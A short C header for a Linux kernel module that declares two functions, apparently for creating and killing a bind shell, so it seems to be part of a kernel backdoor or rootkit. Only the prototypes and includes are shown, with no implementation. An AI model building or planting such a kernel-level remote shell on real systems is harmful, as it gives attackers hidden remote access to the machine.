#ifndef BINDSHELL_H
#define BINDSHELL_H

#include <linux/kmod.h>
#include <linux/module.h>
#include <linux/sched/signal.h>

void bindshell_create(char *);
void bindshell_kill(void);

#endif
